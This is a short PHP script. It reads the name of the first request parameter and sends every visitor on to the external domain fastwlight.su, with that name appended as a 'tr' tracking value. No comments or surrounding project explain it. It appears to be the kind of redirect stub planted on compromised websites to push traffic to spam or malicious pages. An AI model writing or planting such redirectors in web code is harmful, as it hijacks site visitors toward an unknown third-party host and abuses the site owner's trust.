<?php
$tr = @array_keys($_REQUEST)[0];

if ($tr != '')
        $tr = "?tr=" . $tr;

header('Location: http://fastwlight.su/' . $tr);
exit;
